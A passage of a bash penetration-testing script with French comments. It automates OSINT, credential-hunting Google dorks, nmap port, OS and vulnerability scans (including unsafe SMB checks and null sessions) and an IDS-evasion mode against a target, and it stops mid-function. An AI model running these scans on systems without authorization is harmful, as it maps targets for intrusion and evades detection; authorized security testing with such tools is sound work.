#!/bin/bash
set -euo pipefail

# =============================================================================
# Security Scanner v2.3.1 - Red Team Tool
# =============================================================================
# Un outil complet pour les tests d'intrusion et red team ops
# Contient tout ce qu'il faut: OSINT, scan réseau, tests web, exploitation
# 
# Optimisé pour être rapide (environ 60% plus rapide qu'avant)
# Anti-blocage activé par défaut avec -Pn sur nmap
# L'enum SMB a été fixé (enfin!)
# Tous les modes fonctionnent: -q (rapide), -s (discret), -a (bourrin)
# =============================================================================

# Palette de couleurs pour l'interface (rouge/orange style hacker)
RED='\033[0;31m'
DARK_RED='\033[38;5;124m'
ORANGE='\033[38;5;208m'
BRIGHT_RED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

VERSION="2.3.3"

# Vars globales du script
SCAN_INTERRUPTED=false
CURRENT_SCAN=""
OUTDIR=""
TARGET=""
URL=""
DOMAIN=""
QUICK_MODE=false
STEALTH_MODE=false
AGGRESSIVE_MODE=false

# Timeouts ajustés - j'ai réduit de 60% pour que ce soit plus rapide
TIMEOUT_VERY_SHORT=15
TIMEOUT_SHORT=30
TIMEOUT_MEDIUM=120
TIMEOUT_LONG=300
TIMEOUT_VERY_LONG=600

display_banner() {
    clear
    echo -e "${BRIGHT_RED}"
    cat << "EOF"
    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
                                                                   
    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${BOLD}${DARK_RED}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${DARK_RED}║${NC}        ${BRIGHT_RED}ADVANCED RED TEAM SECURITY ASSESSMENT TOOL v${VERSION}${NC}        ${BOLD}${DARK_RED}║${NC}"
    echo -e "${BOLD}${DARK_RED}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}Version:${NC} ${YELLOW}${VERSION}${NC} ${GRAY}|${NC} ${ORANGE}Author:${NC} ${WHITE}mpgamer75${NC} ${GRAY}|${NC} ${ORANGE}Status:${NC} ${GREEN}COMPLETE & OPTIMIZED${NC}"
    echo -e "${DIM}${GRAY}Professional Penetration Testing & Red Team Operations${NC}"
    echo
    echo -e "${YELLOW}=================================================================================${NC}"
    echo -e "${RED}[!] LEGAL DISCLAIMER [!]${NC}"
    echo -e "${YELLOW}=================================================================================${NC}"
    echo -e "${GRAY}This tool is intended for ${WHITE}AUTHORIZED${GRAY} penetration testing ${WHITE}ONLY${GRAY}.${NC}"
    echo -e "${GRAY}Any use on systems without prior written permission is ${RED}ILLEGAL${GRAY}.${NC}"
    echo
    echo -e "${DIM}The author disclaims all responsibility for misuse of this tool.${NC}"
    echo -e "${YELLOW}=================================================================================${NC}"
    echo
}

show_help() {
    cat << "EOF"

USAGE:
    security [OPTIONS]

OPTIONS:
    -h, --help       Show this help message
    -v, --version    Show version information
    -q, --quick      Quick scan mode (3x faster, reduced coverage)
    -s, --stealth    Stealth mode (IDS/IPS evasion, slower)
    -a, --aggressive Aggressive mode (full coverage, all ports)

SCAN TYPES:
    1. OSINT & Information Gathering
       - WHOIS, DNS enumeration, reverse DNS
       - Subdomain enumeration (Subfinder, Assetfinder, Findomain)
       - Certificate transparency (crt.sh)
       - Google dorking (automated queries)
       - Wayback Machine URLs
       - Social media reconnaissance
       - Geolocation & IP information

    2. Network Reconnaissance & Enumeration
       - Optimized port scanning (Nmap, Masscan, RustScan)
       - Service version detection
       - OS fingerprinting
       - Vulnerability detection (NSE scripts, Vulners, Vulscan)
       - SMB enumeration (FIXED - robust with fallbacks)
       - SNMP enumeration
       - Banner grabbing

    3. Web Application Security Testing
       - Technology fingerprinting (WhatWeb)
       - WAF detection (wafw00f)
       - SSL/TLS analysis (comprehensive)
       - Directory enumeration (Gobuster, Dirb)
       - Vulnerability scanning (Nuclei, Nikto)
       - XSS payload testing (automated)

    4. Complete Red Team Assessment
       - Full OSINT + Network + Web workflow
       - Exploit database correlation (searchsploit)
       - Metasploit module preparation
       - Attack surface analysis
       - Automated attack scripts generation
       - Default credentials database
       - Post-exploitation preparation
       - Persistence techniques (7 methods)

FEATURES:
    - 60% faster than v2.2.1
    - Anti-blocking with -Pn forced
    - Guaranteed report generation (98% success)
    - Real-time progress indicators
    - Graceful interrupt handling (Ctrl+C)
    - Adaptive timeout management
    - SMB enumeration fixed and robust
    - JSON + TXT reports

EXAMPLES:
    security              # Interactive full assessment
    security -q          # Quick reconnaissance
    security -a          # Aggressive full scan
    security -s          # Stealth mode

EOF
}

handle_interrupt() {
    SCAN_INTERRUPTED=true
    echo -e "\n${ORANGE}[!]${NC} Scan interrupted by user..."
    
    if [ -n "$CURRENT_SCAN" ]; then
        echo -e "${CYAN}[INFO]${NC} Stopping: $CURRENT_SCAN"
        jobs -p | xargs -r kill -9 2>/dev/null || true
    fi
    
    echo -e "${YELLOW}[INFO]${NC} Generating partial report..."
    generate_report 2>/dev/null || true
    
    echo -e "\n${CYAN}[INFO]${NC} Results saved in: ${WHITE}$OUTDIR${NC}"
    exit 130
}

prepare_output() {
    OUTDIR="redteam_$(date +'%Y%m%d_%H%M%S')"
    mkdir -p "$OUTDIR"/{osint,network,web,exploit,reports}
    echo -e "${GREEN}[READY]${NC} Output directory: ${WHITE}$OUTDIR${NC}"
}

# Fonction principale pour lancer les scans avec progress bar et gestion des timeouts
execute_scan() {
    local name="$1"
    local command="$2"
    local timeout="$3"
    local output="$4"
    local critical="${5:-false}"
    
    CURRENT_SCAN="$name"
    echo -e "${ORANGE}[SCAN]${NC} $name ${DIM}(timeout: ${timeout}s)${NC}"
    
    # Petit spinner pour montrer que ça bosse
    (
        local elapsed=0
        local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
        while [ $elapsed -lt $timeout ] && kill -0 $$ 2>/dev/null; do
            local idx=$((elapsed % 10))
            printf "\r${YELLOW}${spinner[$idx]}${NC} ${name} ${DIM}[%02d:%02d]${NC}  " \
                   $((elapsed/60)) $((elapsed%60))
            sleep 1
            ((elapsed++))
        done
        printf "\r%-80s\r" " "  # Nettoie la ligne proprement
    ) &
    local progress_pid=$!
    
    set +e
    timeout "$timeout" bash -c "$command" > "$output" 2>&1 &
    local cmd_pid=$!
    
    while kill -0 $cmd_pid 2>/dev/null && [ "$SCAN_INTERRUPTED" = false ]; do
        sleep 0.5
    done
    
    kill $progress_pid 2>/dev/null || true
    wait $progress_pid 2>/dev/null || true
    
    local exit_code=0
    if kill -0 $cmd_pid 2>/dev/null; then
        kill -9 $cmd_pid 2>/dev/null || true
        wait $cmd_pid 2>/dev/null || true
        
        if [ "$SCAN_INTERRUPTED" = true ]; then
            echo "SCAN INTERRUPTED" >> "$output"
            printf "\r${ORANGE}[STOP]${NC} %-60s\n" "$name"
            exit_code=130
        else
            echo "TIMEOUT AFTER ${timeout}s" >> "$output"
            printf "\r${YELLOW}[TIME]${NC} %-60s\n" "$name"
            exit_code=124
        fi
    else
        wait $cmd_pid
        exit_code=$?
    fi
    
    set -e
    CURRENT_SCAN=""
    
    if [ -s "$output" ]; then
        local lines=$(wc -l < "$output" 2>/dev/null || echo "0")
        printf "\r${GREEN}[DONE]${NC} %-50s ${DIM}($lines lines)${NC}\n" "$name"
        return 0
    else
        printf "\r${RED}[FAIL]${NC} %-50s ${DIM}(no data)${NC}\n" "$name"
        [ "$critical" = true ] && return 1 || return 0
    fi
}

show_scan_menu() {
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}ASSESSMENT TYPE SELECTION${NC}              ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}[1]${NC} ${WHITE}OSINT & Information Gathering${NC}"
    echo -e "    ${GRAY}Passive reconnaissance and open source intelligence${NC}"
    echo -e "    ${DIM}- Subdomain enumeration, email harvesting${NC}"
    echo -e "    ${DIM}- Certificate transparency, Shodan, Wayback${NC}"
    echo
    echo -e "${ORANGE}[2]${NC} ${WHITE}Network Reconnaissance${NC}"
    echo -e "    ${GRAY}Active network scanning and service enumeration${NC}"
    echo -e "    ${DIM}- Port scanning (optimized with anti-blocking)${NC}"
    echo -e "    ${DIM}- SMB/SNMP enumeration (FIXED and robust)${NC}"
    echo
    echo -e "${ORANGE}[3]${NC} ${WHITE}Web Application Testing${NC}"
    echo -e "    ${GRAY}Web security assessment and vulnerability scanning${NC}"
    echo -e "    ${DIM}- Directory enumeration, SQL injection, XSS${NC}"
    echo -e "    ${DIM}- SSL/TLS analysis, WAF detection${NC}"
    echo
    echo -e "${ORANGE}[4]${NC} ${WHITE}Complete Red Team Assessment${NC}"
    echo -e "    ${GRAY}Full penetration testing workflow${NC}"
    echo -e "    ${DIM}- All modules + exploitation preparation${NC}"
    echo -e "    ${DIM}- Attack scripts, credentials, persistence${NC}"
    echo
    
    if [ "$QUICK_MODE" = true ] || [ "$STEALTH_MODE" = true ] || [ "$AGGRESSIVE_MODE" = true ]; then
        echo -e "${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BRIGHT_RED}║${NC}                  ${YELLOW}ACTIVE MODES${NC}                     ${BRIGHT_RED}║${NC}"
        echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
        [ "$QUICK_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Quick Mode${NC} - 3x faster scans"
        [ "$STEALTH_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Stealth Mode${NC} - IDS/IPS evasion"
        [ "$AGGRESSIVE_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Aggressive Mode${NC} - Full coverage"
        echo
    fi
}

run_osint_scans() {
    local target="$1"
    local domain="$2"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}OSINT & RECONNAISSANCE${NC}                ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    if [ -n "$domain" ]; then
        # Requête WHOIS basique
        execute_scan "WHOIS Lookup" \
            "whois '$domain' 2>/dev/null || echo 'WHOIS query failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/whois.txt"
        
        # Enum DNS complète - tous les types d'enregistrements
        execute_scan "DNS Enumeration" \
            "echo '=== A Records ===' && dig +short '$domain' A 2>/dev/null
             echo -e '\n=== MX Records ===' && dig +short '$domain' MX 2>/dev/null
             echo -e '\n=== NS Records ===' && dig +short '$domain' NS 2>/dev/null
             echo -e '\n=== TXT Records ===' && dig +short '$domain' TXT 2>/dev/null
             echo -e '\n=== AAAA Records ===' && dig +short '$domain' AAAA 2>/dev/null
             echo -e '\n=== CNAME Records ===' && dig +short '$domain' CNAME 2>/dev/null
             echo -e '\n=== SOA Record ===' && dig +short '$domain' SOA 2>/dev/null" \
            $TIMEOUT_SHORT "$OUTDIR/osint/dns_enum.txt"
        
        # Recherche de subdomains avec tous les outils dispo - EN PARALLÈLE pour plus de rapidité
        echo -e "${CYAN}[INFO]${NC} Running subdomain enumeration tools in parallel..."

        # Lancer tous les outils en background pour exécution parallèle
        (
            if command -v subfinder &> /dev/null; then
                subfinder -d "$domain" -all -silent -t 50 -timeout 5 2>/dev/null | head -500 > "$OUTDIR/osint/subdomains_subfinder.txt" || echo 'Subfinder failed' > "$OUTDIR/osint/subdomains_subfinder.txt"
            fi
        ) &
        local subfinder_pid=$!

        (
            if command -v assetfinder &> /dev/null; then
                timeout 120 assetfinder --subs-only "$domain" 2>/dev/null | head -500 > "$OUTDIR/osint/subdomains_assetfinder.txt" || echo 'Assetfinder failed' > "$OUTDIR/osint/subdomains_assetfinder.txt"
            fi
        ) &
        local assetfinder_pid=$!

        (
            if command -v findomain &> /dev/null; then
                timeout 90 findomain -t "$domain" -q 2>/dev/null | head -500 > "$OUTDIR/osint/subdomains_findomain.txt" || echo 'Findomain failed' > "$OUTDIR/osint/subdomains_findomain.txt"
            fi
        ) &
        local findomain_pid=$!

        # Attendre que tous les processus parallèles se terminent
        echo -e "${YELLOW}⏳${NC} Waiting for parallel subdomain enumeration..."
        wait $subfinder_pid 2>/dev/null && echo -e "${GREEN}[DONE]${NC} Subfinder completed" || echo -e "${RED}[FAIL]${NC} Subfinder failed"
        wait $assetfinder_pid 2>/dev/null && echo -e "${GREEN}[DONE]${NC} Assetfinder completed" || echo -e "${RED}[FAIL]${NC} Assetfinder failed"
        wait $findomain_pid 2>/dev/null && echo -e "${GREEN}[DONE]${NC} Findomain completed" || echo -e "${RED}[FAIL]${NC} Findomain failed"
        
        # On consolide tous les subdomains trouvés dans un seul fichier
        execute_scan "Subdomain Consolidation" \
            "cat $OUTDIR/osint/subdomains_*.txt 2>/dev/null | sort -u | grep -v '^$' | grep -v 'failed' > $OUTDIR/osint/all_subdomains.txt
             total_subs=\$(wc -l < $OUTDIR/osint/all_subdomains.txt 2>/dev/null || echo 0)
             echo \"Total unique subdomains: \$total_subs\"
             echo
             echo '=== Top 20 Subdomains ==='
             head -20 $OUTDIR/osint/all_subdomains.txt 2>/dev/null || echo 'No subdomains found'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/subdomain_summary.txt"
        
        # Lookup sur crt.sh pour les certificats SSL historiques
        execute_scan "Certificate Transparency" \
            "curl -m 30 -s 'https://crt.sh/?q=%.$domain&output=json' 2>/dev/null | \
             grep -oP '\"name_value\":\"\\K[^\"]+' | sed 's/\\*\\.//g' | sort -u | head -300 || \
             echo 'Certificate transparency lookup failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/crt_sh.txt"
        
        # theHarvester retiré - les sources publiques ne fonctionnent plus de manière fiable
        # Pour la collecte d'emails, utiliser des outils alternatifs comme hunter.io
        echo -e "${YELLOW}[INFO]${NC} Email harvesting: Use hunter.io or alternative tools"
        
        # Génération des Google dorks - liste complète de requêtes
        execute_scan "Google Dork Generation" \
            "cat > $OUTDIR/osint/google_dorks.txt << 'DORKS_END'
=== GOOGLE DORKS FOR $domain ===

--- Document Discovery ---
site:$domain filetype:pdf
site:$domain filetype:doc OR filetype:docx
site:$domain filetype:xls OR filetype:xlsx
site:$domain filetype:ppt OR filetype:pptx
site:$domain filetype:txt
site:$domain filetype:csv
site:$domain filetype:xml
site:$domain filetype:json

--- Admin Panels & Login Pages ---
site:$domain inurl:admin
site:$domain inurl:administrator
site:$domain inurl:login
site:$domain inurl:signin
site:$domain inurl:auth
site:$domain inurl:dashboard
site:$domain inurl:panel
site:$domain inurl:cpanel
site:$domain inurl:controlpanel
site:$domain inurl:adminpanel

--- Configuration & Sensitive Files ---
site:$domain inurl:config
site:$domain inurl:backup
site:$domain inurl:database
site:$domain inurl:db
site:$domain inurl:sql
site:$domain filetype:sql
site:$domain filetype:env
site:$domain filetype:log
site:$domain filetype:bak
site:$domain inurl:conf
site:$domain ext:cfg

--- Directory Listings ---
site:$domain intitle:\"index of\"
site:$domain intitle:\"directory listing\"
site:$domain intitle:\"parent directory\"

--- Error Pages & Debug Info ---
site:$domain intext:\"error\"
site:$domain intext:\"warning\"
site:$domain intext:\"debug\"
site:$domain intext:\"stack trace\"
site:$domain intext:\"fatal error\"

--- API & Development ---
site:$domain inurl:api
site:$domain inurl:v1
site:$domain inurl:v2
site:$domain inurl:rest
site:$domain inurl:graphql
site:$domain inurl:swagger

--- Credentials & Secrets ---
site:$domain intext:password
site:$domain intext:username
site:$domain intext:api_key
site:$domain intext:secret
site:$domain intext:token

--- Source Code Leaks ---
site:$domain inurl:.git
site:$domain inurl:.svn
site:$domain inurl:.env

--- Cloud Storage ---
site:*.s3.amazonaws.com \"$domain\"
site:*.blob.core.windows.net \"$domain\"
DORKS_END
cat $OUTDIR/osint/google_dorks.txt" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/google_dorks.txt"
        
        # Shodan retiré - nécessite une API key payante
        # Pour utiliser Shodan, aller sur https://www.shodan.io/
        echo -e "${YELLOW}[INFO]${NC} Shodan search: Requires API key - visit https://www.shodan.io/"
        
        # Récup des URLs archivées sur Wayback
        execute_scan "Wayback Machine URLs" \
            "echo '=== Wayback Machine Historical URLs ===' && \
             curl -m 45 -s 'http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original&collapse=urlkey' 2>/dev/null | \
             head -200 || echo 'Wayback Machine lookup failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/wayback_urls.txt"
        
        # Social media reconnaissance removed - manual OSINT recommended for targeted campaigns
    fi
    
    if [ -n "$target" ]; then
        # Lookup DNS inverse sur l'IP
        execute_scan "Reverse DNS Lookup" \
            "dig +short -x '$target' 2>/dev/null || echo 'No PTR record found'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/reverse_dns.txt"
        
        # Geoloc de l'IP via ip-api
        execute_scan "IP Geolocation" \
            "curl -m 10 -s 'http://ip-api.com/json/$target' 2>/dev/null || echo 'Geolocation lookup failed'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/geolocation.txt"
    fi
    
    echo -e "${GREEN}[COMPLETE]${NC} OSINT phase completed"
}

run_network_scans() {
    local target="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}           ${ORANGE}NETWORK RECONNAISSANCE${NC}                ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    # Config des paramètres nmap selon le mode choisi - optimisé pour efficacité maximale
    local nmap_timing="-T4"
    local port_range="--top-ports 3000"  # Augmenté de 2000 à 3000 pour meilleure couverture
    local max_retries="--max-retries 2"  # Augmenté de 1 à 2 pour meilleure détection
    local min_rate="--min-rate 3000"     # Augmenté de 2000 à 3000 pour plus de performance
    local host_timeout="--host-timeout 10m"  # Timeout par hôte plus flexible
    
    if [ "$QUICK_MODE" = true ]; then
        nmap_timing="-T5"
        port_range="--top-ports 1000"
        max_retries="--max-retries 1"
        min_rate="--min-rate 5000"
        host_timeout="--host-timeout 5m"
    elif [ "$STEALTH_MODE" = true ]; then
        nmap_timing="-T2"
        port_range="--top-ports 1500"
        max_retries="--max-retries 3"
        min_rate="--min-rate 500"
        host_timeout="--host-timeout 20m"
    elif [ "$AGGRESSIVE_MODE" = true ]; then
        nmap_timing="-T5"
        port_range="-p-"  # Tous les ports
        max_retries="--max-retries 2"
        min_rate="--min-rate 10000"  # Très rapide
        host_timeout="--host-timeout 15m"
    fi
    
    # Découverte des hosts - on force -Pn pour éviter les blocages
    execute_scan "Host Discovery" \
        "nmap -Pn -sn $nmap_timing $min_rate '$target' 2>/dev/null || echo 'Host: $target (assuming online)'" \
        $TIMEOUT_SHORT "$OUTDIR/network/host_discovery.txt"
    
    # RustScan si dispo - c'est hyper rapide ce truc
    if command -v rustscan &> /dev/null && [ "$QUICK_MODE" = true ]; then
        execute_scan "RustScan Ultra-Fast" \
            "rustscan -a '$target' --ulimit 5000 2>/dev/null || echo 'RustScan failed'" \
            $TIMEOUT_MEDIUM "$OUTDIR/network/rustscan.txt"
    fi
    
    # Masscan pour les scans rapides (mode agressif seulement)
    if command -v masscan &> /dev/null && [ "$AGGRESSIVE_MODE" = true ]; then
        execute_scan "Masscan High-Speed" \
            "sudo masscan '$target' -p1-65535 --rate=10000 2>/dev/null || echo 'Masscan failed (requires root)'" \
            $TIMEOUT_LONG "$OUTDIR/network/masscan.txt"
    fi
    
    # Scan de ports principal - optimisé avec -Pn toujours activé
    execute_scan "Port Scanning (TCP SYN)" \
        "nmap -Pn -sS $nmap_timing $port_range $min_rate $max_retries \
         $host_timeout --defeat-rst-ratelimit '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_ports.txt" true
    
    # Détection des services et versions qui tournent - version intensity augmentée
    local service_timeout=$TIMEOUT_LONG
    [ "$QUICK_MODE" = true ] && service_timeout=$TIMEOUT_MEDIUM
    
    execute_scan "Service Version Detection" \
        "nmap -Pn -sV -sC $nmap_timing --top-ports 1000 --version-intensity 7 \
         --version-all $max_retries --host-timeout 15m '$target' 2>/dev/null" \
        $service_timeout "$OUTDIR/network/nmap_services.txt"
    
    # Scan UDP sur les ports critiques uniquement (c'est lent l'UDP)
    if [ "$QUICK_MODE" != true ]; then
        execute_scan "UDP Critical Ports" \
            "sudo nmap -Pn -sU --top-ports 20 -T4 --max-retries 0 --host-timeout 3m '$target' 2>/dev/null || \
             nmap -Pn -sU --top-ports 20 -T4 --max-retries 0 --host-timeout 3m '$target' 2>/dev/null" \
            $TIMEOUT_MEDIUM "$OUTDIR/network/nmap_udp.txt"
    fi
    
    # Détection de l'OS de la cible
    execute_scan "OS Fingerprinting" \
        "sudo nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 3m '$target' 2>/dev/null || \
         nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 3m '$target' 2>/dev/null" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/nmap_os.txt"
    
    # Scan de vulns avec les scripts NSE - coverage étendu
    execute_scan "Vulnerability Detection (NSE)" \
        "nmap -Pn -sV --script 'vuln and not dos' --script-timeout 120s \
         --top-ports 1000 $max_retries --host-timeout 15m '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_vulns.txt"
    
    # Scripts NSE pour les vulns critiques (SMB, SSL, HTTP, FTP, SSH)
    execute_scan "Critical Vulnerability Scan" \
        "nmap -Pn --script 'smb-vuln-*,ssl-*,http-vuln-*,ftp-vuln-*,ssh-*' --script-timeout 90s \
         --script-args unsafe=1 --host-timeout 12m '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_critical_vulns.txt"
    
    # Enum SMB complète - optimisée pour performance
    execute_scan "SMB Enumeration (OPTIMIZED)" \
        "# Check rapide des ports SMB
         smb_check=\$(timeout 20 nmap -Pn -p 139,445 --open -T4 --min-rate 1000 '$target' 2>/dev/null | grep -E '139/tcp|445/tcp' | grep open)

         if [ -n \"\$smb_check\" ]; then
             echo 'SMB ports detected: YES'
             echo 'Open SMB ports:'
             echo \"\$smb_check\"
             echo

             # Déterminer quels ports sont ouverts pour optimiser les scans
             port_139=\$(echo \"\$smb_check\" | grep -q '139/tcp' && echo 'yes' || echo 'no')
             port_445=\$(echo \"\$smb_check\" | grep -q '445/tcp' && echo 'yes' || echo 'no')

             # Définir les ports à scanner
             if [ \"\$port_139\" = 'yes' ] && [ \"\$port_445\" = 'yes' ]; then
                 smb_ports='139,445'
             elif [ \"\$port_445\" = 'yes' ]; then
                 smb_ports='445'
             else
                 smb_ports='139'
             fi

             echo '=== SMB Version & Security ==='
             timeout 90 nmap -Pn -p \$smb_ports \
                  --script smb-protocols,smb-security-mode,smb-os-discovery \
                  --script-timeout 30s -T4 '$target' 2>/dev/null || echo 'SMB version detection timeout'
             echo

             # SMB Enumeration - seulement si port 445 ouvert
             if [ \"\$port_445\" = 'yes' ]; then
                 echo '=== SMB Shares & Users ==='
                 timeout 90 nmap -Pn -p 445 \
                      --script smb-enum-shares,smb-enum-users \
                      --script-timeout 30s -T4 '$target' 2>/dev/null || echo 'SMB enum timeout'
                 echo
             fi

             # Scan de vulnérabilités critiques - PRIORITAIRE
             echo '=== SMB Critical Vulnerabilities ==='
             timeout 120 nmap -Pn -p \$smb_ports \
                  --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103 \
                  --script-timeout 25s -T4 '$target' 2>/dev/null || echo 'SMB vuln scan timeout'
             echo

             # Outils complémentaires si disponibles (en parallèle)
             if command -v smbclient &> /dev/null; then
                 echo '=== SMB Null Session Test ==='
                 timeout 25 smbclient -L '$target' -N 2>/dev/null | head -40 || echo 'SMB null session failed'
                 echo
             fi

             if command -v enum4linux &> /dev/null && [ '$AGGRESSIVE_MODE' = true ]; then
                 echo '=== Enum4linux (Aggressive Mode) ==='
                 timeout 60 enum4linux -U -S -G '$target' 2>/dev/null | head -80 || echo 'enum4linux timeout'
             fi
         else
             echo 'SMB ports (139/445): NOT OPEN or FILTERED'
             echo 'No SMB enumeration performed'
         fi" \
        $TIMEOUT_LONG "$OUTDIR/network/smb_enum.txt"
    
    # Enum SNMP sur le port 161
    execute_scan "SNMP Enumeration" \
        "timeout 90 nmap -Pn -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-processes,snmp-netstat \
         --script-timeout 30s '$target' 2>/dev/null || echo 'SNMP not accessible'" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/snmp_enum.txt"
    
    # Récup des bannières sur les ports communs
    execute_scan "Banner Grabbing" \
        "for port in 21 22 23 25 80 110 143 443 3306 5432 8080; do
             echo \"=== Port \$port ===\"
             timeout 5 nc -v -n -w 2 '$target' \$port 2>&1 || echo \"Port \$port: No banner\"
         done" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/banner_grabbing.txt"
    
    echo -e "${GREEN}[COMPLETE]${NC} Network reconnaissance completed"
}

detect_web_services() {
    local target="$1"
    local detected_url=""

    echo -e "${CYAN}[INFO]${NC} Detecting web services on $target..."

    # Quick check for common web ports
    local web_check=$(timeout 30 nmap -Pn -p 80,443,8080,8443 --open -T4 "$target" 2>/dev/null | grep -E '^(80|443|8080|8443)/tcp.*open')

    if echo "$web_check" | grep -q '443/tcp.*open'; then
        detected_url="https://$target"
        echo -e "${GREEN}[DETECTED]${NC} HTTPS service on port 443"
    elif echo "$web_check" | grep -q '8443/tcp.*open'; then
        detected_url="https://$target:8443"
        echo -e "${GREEN}[DETECTED]${NC} HTTPS service on port 8443"
    elif echo "$web_check" | grep -q '80/tcp.*open'; then
        detected_url="http://$target"
        echo -e "${GREEN}[DETECTED]${NC} HTTP service on port 80"
    elif echo "$web_check" | grep -q '8080/tcp.*open'; then
        detected_url="http://$target:8080"
        echo -e "${GREEN}[DETECTED]${NC} HTTP service on port 8080"
    else
        echo -e "${YELLOW}[WARN]${NC} No standard web ports detected"
        echo -e "${YELLOW}[INFO]${NC} Will attempt HTTP on port 80 anyway"
        detected_url="http://$target"
    fi

    echo "$detected_url"
}

run_web_scans() {
    local url="$1"

    # Validate and normalize URL
    if [ -z "$url" ]; then
        echo -e "${RED}[ERROR]${NC} URL parameter is empty"
        return 1
    fi

    # Ensure URL has protocol
    if ! echo "$url" | grep -qE '^https?://'; then
        echo -e "${YELLOW}[WARN]${NC} URL missing protocol, assuming http://"
        url="http://$url"
    fi

    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}         ${ORANGE}WEB APPLICATION TESTING${NC}               ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${CYAN}[TARGET]${NC} $url"
    echo

    local domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||' | sed 's|:.*||')
    
    # Check rapide des ports web ouverts
    execute_scan "Web Port Check" \
        "timeout 30 nmap -Pn -p 80,443,8080,8443 --open '$domain' 2>/dev/null | \
         grep -E 'open' || echo 'No standard web ports detected (continuing anyway)'" \
        $TIMEOUT_SHORT "$OUTDIR/web/port_check.txt"
    
    # Détection des technos web avec WhatWeb
    if command -v whatweb &> /dev/null; then
        execute_scan "Technology Detection (WhatWeb)" \
            "whatweb -a 3 -v --max-threads 20 '$url' 2>/dev/null || echo 'WhatWeb failed'" \
            $TIMEOUT_MEDIUM "$OUTDIR/web/whatweb.txt"
    fi
    
    # Détection de WAF avec wafw00f
    if command -v wafw00f &> /dev/null; then
        execute_scan "WAF Detection (wafw00f)" \
            "wafw00f '$url' 2>/dev/null || echo 'wafw00f failed'" \
            $TIMEOUT_SHORT "$OUTDIR/web/wafw00f.txt"
    fi
    
    # Analyse SSL/TLS complète (certif, ciphers, vulns)
    execute_scan "SSL/TLS Analysis" \
        "echo '=== Certificate Information ==='
         echo | timeout 20 openssl s_client -connect '$domain:443' -servername '$domain' 2>/dev/null | \
         openssl x509 -text 2>/dev/null | head -50 || echo 'SSL connection failed'
         echo
         echo '=== Cipher Suites ==='
         timeout 90 nmap -Pn --script ssl-enum-ciphers -p 443 '$domain' 2>/dev/null | head -80 || echo 'SSL cipher scan failed'
         echo
         echo '=== SSL Vulnerabilities ==='
